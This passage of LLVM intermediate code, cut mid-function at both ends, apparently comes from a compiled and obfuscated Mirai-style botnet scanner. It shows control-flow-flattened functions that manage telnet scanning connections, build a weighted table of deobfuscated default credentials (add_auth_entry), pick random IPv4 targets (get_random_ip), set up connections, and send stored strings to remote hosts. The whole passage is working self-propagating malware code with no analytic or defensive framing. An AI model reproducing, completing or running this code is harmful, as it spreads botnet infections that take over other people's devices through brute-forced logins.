  br label %loopEnd

; <label>:1157:                                   ; preds = %loopEntry
  %1158 = load i32, i32* %35, align 4
  %1159 = icmp eq i32 %1158, -1
  %1160 = select i1 %1159, i32 562935761, i32 -261752256
  store i32 %1160, i32* %switchVar
  br label %loopEnd

; <label>:1161:                                   ; preds = %loopEntry
  %1162 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1163 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1162, i32 0, i32 16
  %1164 = load i32, i32* %1163, align 8
  %1165 = icmp eq i32 %1164, 11
  %1166 = select i1 %1165, i32 -1810496238, i32 959766031
  store i32 %1166, i32* %switchVar
  br label %loopEnd

; <label>:1167:                                   ; preds = %loopEntry
  %1168 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1168, i32 0, i32 1
  %1170 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1169, i32 0, i32 1
  %1171 = load i32, i32* %1170, align 4
  %1172 = icmp eq i32 %1171, 0
  %1173 = select i1 %1172, i32 -1810496238, i32 15017234
  store i32 %1173, i32* %switchVar
  br label %loopEnd

; <label>:1174:                                   ; preds = %loopEntry
  %1175 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1175, i32 1)
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1176:                                   ; preds = %loopEntry
  %1177 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1178 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1177, i32 0, i32 1
  %1179 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1178, i32 0, i32 1
  store i32 0, i32* %1179, align 4
  %1180 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1181 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1180, i32 0, i32 16
  store i32 11, i32* %1181, align 8
  call void @table_unlock_val(i8 zeroext 11)
  %1182 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1183 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1182, i32 0, i32 2
  %1184 = load i32, i32* %1183, align 8
  %1185 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1186 = call i32 (i32, i8*, ...) @fdsend(i32 %1184, i8* %1185)
  call void @table_lock_val(i8 zeroext 11)
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1187:                                   ; preds = %loopEntry
  %1188 = load i32, i32* %35, align 4
  %1189 = icmp eq i32 %1188, -2
  %1190 = select i1 %1189, i32 329318836, i32 -1159470492
  store i32 %1190, i32* %switchVar
  br label %loopEnd

; <label>:1191:                                   ; preds = %loopEntry
  %1192 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1192, i32 1)
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1193:                                   ; preds = %loopEntry
  store i32 -1839712369, i32* %switchVar
  br label %loopEnd

; <label>:1194:                                   ; preds = %loopEntry
  store i32 -457906068, i32* %switchVar
  br label %loopEnd

; <label>:1195:                                   ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 941318070, i32* %switchVar
  br label %loopEnd

; <label>:1196:                                   ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1197:                                   ; preds = %loopEntry
  %1198 = load i32, i32* %35, align 4
  %1199 = icmp eq i32 %1198, 0
  %1200 = select i1 %1199, i32 1324290248, i32 -1163321379
  store i32 %1200, i32* %switchVar
  br label %loopEnd

; <label>:1201:                                   ; preds = %loopEntry
  store i32 -204228335, i32* %switchVar
  br label %loopEnd

; <label>:1202:                                   ; preds = %loopEntry
  %1203 = load i32, i32* %35, align 4
  %1204 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1205 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1204, i32 0, i32 4
  %1206 = load i32, i32* %1205, align 8
  %1207 = icmp sgt i32 %1203, %1206
  %1208 = select i1 %1207, i32 -401187967, i32 668916634
  store i32 %1208, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  %1210 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1211 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1210, i32 0, i32 4
  %1212 = load i32, i32* %1211, align 8
  store i32 %1212, i32* %35, align 4
  store i32 668916634, i32* %switchVar
  br label %loopEnd

; <label>:1213:                                   ; preds = %loopEntry
  %1214 = load i32, i32* %35, align 4
  %1215 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1216 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1215, i32 0, i32 4
  %1217 = load i32, i32* %1216, align 8
  %1218 = sub nsw i32 %1217, %1214
  store i32 %1218, i32* %1216, align 8
  %1219 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1219, i32 0, i32 7
  %1221 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1220, i32 0, i32 0
  %1222 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1223 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1222, i32 0, i32 7
  %1224 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1223, i32 0, i32 0
  %1225 = load i32, i32* %35, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds i8, i8* %1224, i64 %1226
  %1228 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1229 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1228, i32 0, i32 4
  %1230 = load i32, i32* %1229, align 8
  %1231 = sext i32 %1230 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1221, i8* %1227, i64 %1231, i32 1, i1 false)
  %1232 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1233 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1232, i32 0, i32 7
  %1234 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1235 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1234, i32 0, i32 4
  %1236 = load i32, i32* %1235, align 8
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1233, i64 0, i64 %1237
  store i8 0, i8* %1238, align 1
  store i32 564366602, i32* %switchVar
  br label %loopEnd

; <label>:1239:                                   ; preds = %loopEntry
  store i32 729831660, i32* %switchVar
  br label %loopEnd

; <label>:1240:                                   ; preds = %loopEntry
  store i32 -1631717358, i32* %switchVar
  br label %loopEnd

; <label>:1241:                                   ; preds = %loopEntry
  store i32 -1780782184, i32* %switchVar
  br label %loopEnd

; <label>:1242:                                   ; preds = %loopEntry
  store i32 -1685743335, i32* %switchVar
  br label %loopEnd

; <label>:1243:                                   ; preds = %loopEntry
  %1244 = load i32, i32* %1, align 4
  %1245 = add nsw i32 %1244, 1
  store i32 %1245, i32* %1, align 4
  store i32 -1912425315, i32* %switchVar
  br label %loopEnd

; <label>:1246:                                   ; preds = %loopEntry
  store i32 -2064983491, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %1246, %1243, %1242, %1241, %1240, %1239, %1213, %1209, %1202, %1201, %1197, %1196, %NewDefault, %1195, %1194, %1193, %1191, %1187, %1176, %1174, %1167, %1161, %1157, %1147, %1142, %1141, %1136, %1127, %1086, %1084, %1078, %1076, %1070, %1065, %1064, %1063, %1060, %1057, %1050, %NewDefault23, %1041, %1032, %1026, %LeafBlock24, %LeafBlock26, %NodeBlock28, %NodeBlock30, %1017, %1011, %1010, %1002, %991, %984, %979, %978, %966, %963, %950, %946, %937, %932, %931, %923, %918, %917, %916, %912, %908, %903, %898, %897, %896, %888, %880, %873, %866, %859, %850, %845, %844, %843, %842, %840, %838, %824, %820, %808, %803, %802, %790, %785, %784, %772, %767, %766, %763, %758, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %LeafBlock13, %NodeBlock15, %NodeBlock17, %NodeBlock19, %NodeBlock21, %741, %732, %731, %730, %728, %726, %712, %707, %702, %698, %696, %675, %663, %657, %656, %650, %649, %631, %628, %624, %615, %604, %595, %577, %576, %566, %562, %557, %555, %553, %546, %543, %542, %541, %540, %536, %514, %508, %507, %503, %481, %475, %474, %469, %468, %466, %464, %456, %444, %443, %437, %428, %413, %409, %408, %399, %398, %389, %388, %376, %375, %371, %368, %367, %361, %352, %348, %346, %345, %333, %332, %324, %323, %315, %314, %306, %305, %297, %296, %287, %286, %277, %276, %269, %268, %261, %260, %255, %254, %249, %244, %227, %226, %225, %222, %167, %163, %161, %156, %110, %104, %100, %99, %85, %80, %77, %56, %52, %46, %41, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #7
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i32, align 4
  %switchVar = alloca i32
  store i32 659019558, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 659019558, label %4
    i32 -1136319541, label %21
    i32 -1539014142, label %27
    i32 1665655515, label %32
    i32 -1495291470, label %34
    i32 -75730757, label %40
    i32 -258915871, label %57
    i32 27305985, label %61
    i32 840473217, label %73
    i32 -387935664, label %77
    i32 -1736012899, label %89
    i32 1760260028, label %93
    i32 1174442629, label %110
    i32 1833685861, label %114
    i32 1471375632, label %131
    i32 -339980335, label %135
    i32 186893532, label %152
    i32 374517714, label %156
    i32 1343668811, label %160
    i32 335808953, label %172
    i32 1698205840, label %176
    i32 82020397, label %180
    i32 2111390523, label %192
    i32 146033962, label %196
    i32 1920208352, label %200
    i32 -1806834880, label %212
    i32 360451575, label %216
    i32 -510133450, label %220
    i32 1084750408, label %232
    i32 -1716376274, label %253
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = call i32 @rand_next()
  %6 = urem i32 %5, 255
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  store i8 %7, i8* %8, align 1
  %9 = call i32 @rand_next()
  %10 = urem i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  store i8 %11, i8* %12, align 1
  %13 = call i32 @rand_next()
  %14 = urem i32 %13, 255
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  store i8 %15, i8* %16, align 1
  %17 = call i32 @rand_next()
  %18 = urem i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  store i8 %19, i8* %20, align 1
  store i32 -1136319541, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %23 = load i8, i8* %22, align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 0
  %26 = select i1 %25, i32 1665655515, i32 -1539014142
  store i32 %26, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 127
  store i32 1665655515, i32* %switchVar
  store i1 %31, i1* %.reg2mem
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %33 = select i1 %.reload, i32 659019558, i32 -1495291470
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i32 @rand_next()
  %36 = urem i32 %35, 35
  store i32 %36, i32* %3, align 4
  %37 = load i32, i32* %3, align 4
  %38 = icmp eq i32 %37, 0
  %39 = select i1 %38, i32 -75730757, i32 -258915871
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = shl i32 %43, 16
  %45 = or i32 1996488704, %44
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = shl i32 %48, 8
  %50 = or i32 %45, %49
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = shl i32 %53, 0
  %55 = or i32 %50, %54
  %56 = call i32 @htonl(i32 %55) #9
  store i32 %56, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %3, align 4
  %59 = icmp eq i32 %58, 1
  %60 = select i1 %59, i32 27305985, i32 840473217
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = shl i32 %64, 8
  %66 = or i32 2006777856, %65
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %68 = load i8, i8* %67, align 1
  %69 = zext i8 %68 to i32
  %70 = shl i32 %69, 0
  %71 = or i32 %66, %70
  %72 = call i32 @htonl(i32 %71) #9
  store i32 %72, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %3, align 4
  %75 = icmp eq i32 %74, 2
  %76 = select i1 %75, i32 -387935664, i32 -1736012899
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = shl i32 %80, 8
  %82 = or i32 2006843392, %81
  %83 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  %86 = shl i32 %85, 0
  %87 = or i32 %82, %86
  %88 = call i32 @htonl(i32 %87) #9
  store i32 %88, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %3, align 4
  %91 = icmp eq i32 %90, 3
  %92 = select i1 %91, i32 1760260028, i32 1174442629
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = shl i32 %96, 16
  %98 = or i32 1946157056, %97
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = shl i32 %101, 8
  %103 = or i32 %98, %102
  %104 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = shl i32 %106, 0
  %108 = or i32 %103, %107
  %109 = call i32 @htonl(i32 %108) #9
  store i32 %109, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %3, align 4
  %112 = icmp eq i32 %111, 4
  %113 = select i1 %112, i32 1833685861, i32 1471375632
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = shl i32 %117, 16
  %119 = or i32 -1174405120, %118
  %120 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = shl i32 %122, 8
  %124 = or i32 %119, %123
  %125 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %126 = load i8, i8* %125, align 1
  %127 = zext i8 %126 to i32
  %128 = shl i32 %127, 0
  %129 = or i32 %124, %128
  %130 = call i32 @htonl(i32 %129) #9
  store i32 %130, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i32, i32* %3, align 4
  %133 = icmp eq i32 %132, 5
  %134 = select i1 %133, i32 -339980335, i32 186893532
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = shl i32 %138, 16
  %140 = or i32 -1325400064, %139
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = shl i32 %143, 8
  %145 = or i32 %140, %144
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = shl i32 %148, 0
  %150 = or i32 %145, %149
  %151 = call i32 @htonl(i32 %150) #9
  store i32 %151, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %3, align 4
  %154 = icmp eq i32 %153, 6
  %155 = select i1 %154, i32 1343668811, i32 374517714
  store i32 %155, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %3, align 4
  %158 = icmp eq i32 %157, 7
  %159 = select i1 %158, i32 1343668811, i32 335808953
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = shl i32 %163, 8
  %165 = or i32 1022558208, %164
  %166 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = shl i32 %168, 0
  %170 = or i32 %165, %169
  %171 = call i32 @htonl(i32 %170) #9
  store i32 %171, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %3, align 4
  %174 = icmp eq i32 %173, 10
  %175 = select i1 %174, i32 82020397, i32 1698205840
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %3, align 4
  %178 = icmp eq i32 %177, 11
  %179 = select i1 %178, i32 82020397, i32 2111390523
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = shl i32 %183, 8
  %185 = or i32 1935802368, %184
  %186 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = shl i32 %188, 0
  %190 = or i32 %185, %189
  %191 = call i32 @htonl(i32 %190) #9
  store i32 %191, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %3, align 4
  %194 = icmp eq i32 %193, 12
  %195 = select i1 %194, i32 1920208352, i32 146033962
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i32, i32* %3, align 4
  %198 = icmp eq i32 %197, 13
  %199 = select i1 %198, i32 1920208352, i32 -1806834880
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = shl i32 %203, 8
  %205 = or i32 -875298816, %204
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 0
  %210 = or i32 %205, %209
  %211 = call i32 @htonl(i32 %210) #9
  store i32 %211, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i32, i32* %3, align 4
  %214 = icmp eq i32 %213, 8
  %215 = select i1 %214, i32 -510133450, i32 360451575
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i32, i32* %3, align 4
  %218 = icmp eq i32 %217, 9
  %219 = select i1 %218, i32 -510133450, i32 1084750408
  store i32 %219, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = shl i32 %223, 8
  %225 = or i32 453443584, %224
  %226 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = shl i32 %228, 0
  %230 = or i32 %225, %229
  %231 = call i32 @htonl(i32 %230) #9
  store i32 %231, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = shl i32 %235, 24
  %237 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = shl i32 %239, 16
  %241 = or i32 %236, %240
  %242 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %243 = load i8, i8* %242, align 1
  %244 = zext i8 %243 to i32
  %245 = shl i32 %244, 8
  %246 = or i32 %241, %245
  %247 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = shl i32 %249, 0
  %251 = or i32 %246, %250
  %252 = call i32 @htonl(i32 %251) #9
  store i32 %252, i32* %1, align 4
  store i32 -1716376274, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i32, i32* %1, align 4
  ret i32 %254

loopEnd:                                          ; preds = %232, %220, %216, %212, %200, %196, %192, %180, %176, %172, %160, %156, %152, %135, %131, %114, %110, %93, %89, %77, %73, %61, %57, %40, %34, %32, %27, %21, %4, %switchDefault
  br label %loopEntry
}

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 2
  %8 = load i32, i32* %7, align 8
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1763054227, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1763054227, label %first
    i32 42984607, label %11
    i32 -1387705839, label %18
    i32 -45357395, label %24
    i32 -260344524, label %25
    i32 -1460337148, label %32
    i32 -1005217885, label %36
